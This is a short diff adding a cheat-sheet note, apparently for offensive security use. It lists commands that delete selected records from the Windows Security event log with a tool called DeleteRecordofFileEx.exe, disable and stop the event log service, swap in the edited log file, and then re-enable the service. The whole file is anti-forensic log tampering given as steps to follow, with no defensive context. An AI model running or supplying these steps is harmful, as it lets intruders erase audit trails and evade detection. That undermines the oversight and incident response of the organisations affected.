@@ -1,0 +1,8 @@
+#tool for deleting Windows event log entries
+DeleteRecordofFileEx.exe Security.evtx <EventRecordID> #EventRecordID will be different than EVENTId
+:\ sc config eventlog start= disabled #change event log service to disabled
+:\ net stop eventlog
+:\ sc query eventlog #confirm it's stopped
+:\ copy temp.evtx c:\windows\system32\winevt\Logs\Security.evtx #temp.evtx is created automatically by DeleteRecordofFileEx
+sc config eventlog start= auto
+#
